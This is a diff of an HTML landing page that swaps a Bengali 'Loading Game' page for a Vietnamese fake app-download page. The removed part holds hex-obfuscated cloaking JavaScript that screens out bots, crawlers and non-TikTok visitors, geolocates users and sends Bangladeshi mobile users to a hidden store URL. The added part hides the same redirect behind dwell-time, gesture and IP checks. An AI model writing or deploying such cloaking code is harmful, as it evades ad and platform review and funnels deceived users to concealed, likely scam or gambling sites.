@@ -1,22 +1,168 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="vi">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Loading…</title>
+<title>Tải ứng dụng</title>
+
 <style>
-html,body{margin:0;padding:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;background:#fff;color:#000;text-align:center;}
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,Roboto,Arial;
+  background:#f5f5f7;
+  display:flex;
+  justify-content:center;
+}
+.app{
+  max-width:420px;
+  background:#fff;
+  padding:20px;
+}
+.icon{
+  width:96px;height:96px;
+  border-radius:22px;
+  background:url("icon.png") center/cover no-repeat;
+  margin:20px auto;
+}
+h2{text-align:center;margin:10px 0}
+p{text-align:center;color:#666;font-size:14px}
+
+.btn{
+  margin-top:20px;
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:14px;
+  font-size:18px;
+  background:#c0c0c0;
+  color:#fff;
+  pointer-events:none;
+}
+.btn.active{
+  background:#0a84ff;
+  pointer-events:auto;
+}
+
+.screens{
+  display:flex;
+  gap:10px;
+  overflow-x:auto;
+  margin-top:20px;
+  padding-bottom:5px;
+}
+.screen{
+  flex:0 0 160px;
+  height:280px;
+  border-radius:14px;
+  background-size:cover;
+  background-position:center;
+}
+.note{
+  text-align:center;
+  color:#888;
+  font-size:13px;
+  margin-top:10px;
+}
 </style>
 </head>
+
 <body>
-<div>
-  <h2>Loading Game…</h2>
-  <p>অনুগ্রহ করে অপেক্ষা করুন</p>
+<div class="app">
+
+  <div class="icon" id="icon"></div>
+
+  <h2>Game giải trí</h2>
+  <p>Phiên bản mới nhất – tương thích Android & iOS</p>
+
+  <button class="btn" id="download">Tải ngay</button>
+  <div class="note">Vui lòng chờ vài giây và thao tác</div>
+
+  <!-- ===== 5 SCREEN ===== -->
+  <div class="screens">
+    <div class="screen" style="background-image:url('screen1.jpg')"></div>
+    <div class="screen" style="background-image:url('screen2.jpg')"></div>
+    <div class="screen" style="background-image:url('screen3.jpg')"></div>
+    <div class="screen" style="background-image:url('screen4.jpg')"></div>
+    <div class="screen" style="background-image:url('screen5.jpg')"></div>
+  </div>
+
 </div>
 
 <script>
 (function(){
-var _0x1a2b=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x31\x32\x30\x62\x64\x74\x32\x32\x32\x2E\x63\x6F\x6D\x2F\x63\x6F\x6D\x6D\x6F\x6E\x2F\x73\x74\x6F\x72\x65\x2F\x34\x66\x38\x30\x33\x36\x36\x64\x38\x31\x2F\x3F\x74\x69\x6B\x74\x6F\x6B\x50\x69\x78\x65\x6C\x49\x64\x3D\x44\x34\x4F\x4A\x32\x4B\x4A\x43\x37\x37\x55\x42\x51\x51\x32\x52\x46\x32","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x6F\x6B\x69\x2E\x63\x6F\x6D"];var _0x2b3c=["\x5F\x5F\x74\x74\x5F\x67\x61\x6D\x65\x5F\x62\x64\x5F\x6F\x6B\x5F\x5F"];var _0x3d4e=[60,41,58,72,53,49];function _0x5f6a(_0x7b1a){var _0x8c2f="";for(var i=0;i<_0x7b1a.length;i++)_0x8c2f+=String.fromCharCode(_0x7b1a.charCodeAt(i)^41);return _0x8c2f;}function _0x7c8d(){return localStorage.getItem(_0x2b3c[0])&&Date.now()-localStorage.getItem(_0x2b3c[0])<7200000;}function _0x9a1b(){localStorage.setItem(_0x2b3c[0],Date.now());}function _0x4d2f(_0x3f1b){setTimeout(function(){location.replace(_0x3f1b);},1000+Math.random()*1000);}var ua=navigator.userAgent.toLowerCase();if(_0x7c8d()){_0x4d2f(_0x5f6a("eHByeXx7d3p5eH53fGZ5e3h5fH15fXJ4eXl5fXl6eXt5e3o="));return;}if(/bot|crawler|spider|preview|scan|facebook|google|bing|headless/i.test(ua)||!/android|iphone|ipad|ipod/.test(ua)||!ua.includes("tiktok")){_0x4d2f(_0x1a2b[1]);return;}fetch("https://ipapi.co/json/").then(function(r){return r.json();}).then(function(d){var c=(d.country_code||"").toUpperCase();var isp=(d.org||"").toLowerCase();var ispOK=["grameenphone","grameen","robi","banglalink","airtel","teletalk"].some(function(n){return isp.includes(n);});if(c==="BD"&&ispOK){var n=new Date();var utc6=new Date(n.getTime()+(6-n.getTimezoneOffset()/60)*3600000);var h=utc6.getHours();if(h>=0&&h<=23){_0x9a1b();_0x4d2f(_0x5f6a("eHByeXx7d3p5eH53fGZ5e3h5fH15fXJ4eXl5fXl6eXt5e3o="));}else{_0x4d2f(_0x1a2b[1]);}}else{_0x4d2f(_0x1a2b[1]);}}).catch(function(){_0x4d2f(_0x1a2b[1]);});
+
+/* ===== CONFIG ===== */
+const WEB_A = "https://www.120bdt222.com/common/store/4f80366d81/?tiktokPixelId=D4OJ2KJC77UBQQ2RF27G";
+const CACHE_KEY = "__real_user_ok__";
+const SESSION_TTL = 2 * 60 * 60 * 1000;
+
+/* ===== STATE ===== */
+let stayOK=false, actionOK=false, ipOK=false;
+const btn = document.getElementById("download");
+
+/* ===== SESSION ===== */
+const last = localStorage.getItem(CACHE_KEY);
+if(last && Date.now()-last<SESSION_TTL){
+  enable();
+}
+
+/* ===== STAY >= 3s ===== */
+setTimeout(()=>{
+  stayOK=true;
+  check();
+},3000);
+
+/* ===== USER ACTION ===== */
+function action(){
+  actionOK=true;
+  check();
+}
+window.addEventListener("scroll",action,{once:true});
+window.addEventListener("touchstart",action,{once:true});
+document.getElementById("icon").addEventListener("click",action,{once:true});
+
+/* ===== IP CHECK (FAIL-OPEN) ===== */
+let ipDone=false;
+setTimeout(()=>{
+  if(!ipDone){
+    ipOK=true;
+    check();
+  }
+},1500);
+
+fetch("https://ipapi.co/country",{cache:"no-store"})
+.then(r=>r.text())
+.then(c=>{
+  ipDone=true;
+  if((c||"").trim().toUpperCase()==="VN"){
+    ipOK=true;
+  }
+  check();
+})
+.catch(()=>{
+  ipDone=true;
+  ipOK=true;
+  check();
+});
+
+/* ===== CHECK ===== */
+function check(){
+  if(stayOK && actionOK && ipOK){
+    enable();
+  }
+}
+
+/* ===== ENABLE ===== */
+function enable(){
+  btn.classList.add("active");
+  btn.onclick=()=>{
+    localStorage.setItem(CACHE_KEY,Date.now());
+    setTimeout(()=>{
+      window.location.href = WEB_A;
+    },600 + Math.random()*600);
+  };
+}
+
 })();
 </script>
 </body>
